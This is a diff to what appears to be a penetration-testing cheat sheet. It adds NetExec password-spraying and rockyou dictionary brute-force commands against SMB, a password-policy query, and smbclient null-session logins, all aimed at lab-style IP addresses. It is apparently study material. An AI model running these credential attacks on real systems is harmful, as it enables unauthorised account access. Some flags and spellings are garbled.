@@ -99,13 +99,22 @@ nxc smb 10.129.2.28 -u 'Guest' -p '' --spider all --pattern txt    # download al
 nxc ldap <DC-IP> -u <user> -p <password> --group                   # List all groups
 nxc ldap <DC-IP> -u <user> -p <password> --group "Domain Admins"   # List members of the Domain Admins group
 ```
- - NXC SMB/RDP Password Attacks
+ - NetExec Passowrd Policy Enumeration
 ```
- nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt –-ignore-pw-decoding
+nxc smb 10.5.10.50 --pass-pol
+```
+ - NetExec SMB/RDP Password Attacks
+```
+# Password Spraying Attack
+nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 –-ignore-pw-decoding
 
--u (path to users file)
--p (path to wordlist)
---ignore-pw-decoding (required to work with rockyou.txt)
+# Brute Force with a wordlist (Dictionary Attack)
+nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt –-ignore-pw-decoding
+
+
+# -u (path to users file)
+# -p (Passwords to try for each users or path to wordlist)
+# --ignore-pw-decoding (required to work with rockyou.txt)
 ```
 ### enum4linux
 ```
@@ -113,8 +122,13 @@ sudo enum4linux -a -A 192.168.220.30
 ```
 ### smbclient
 ```
+# SMB loging if you know a user name and password
 smbclient -U <username> //<ip>/<share>
 Example: smbclient -U student //10.5.10.30/po-shares
+
+# SMB null authentication (try that if you want to login without username and password)
+smbclient //<ip>/<share> -N
+Example: smbclient //10.5.10.30/po-shares -N
 ```
 ## 3. GoBuster
 ```
@@ -128,11 +142,16 @@ gobuster dir -u http://10.20.10.31 -w /usr/share/wordlists/seclists/Discovery/We
 # Section 3. Weaponization
  - NXC SMB/RDP Password Attacks
 ```
+# Password Spraying Attack
+nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 –-ignore-pw-decoding
+
+# Brute Force with a wordlist (Dictionary Attack)
 nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt –-ignore-pw-decoding
 
--u (path to users file)
--p (path to wordlist)
---ignore-pw-decoding (required to work with rockyou.txt)
+
+# -u (path to users file)
+# -p (Passwords to try for each users or path to wordlist)
+# --ignore-pw-decoding (required to work with rockyou.txt)
 ```
  - Impacket Get-NPUsers
 ```
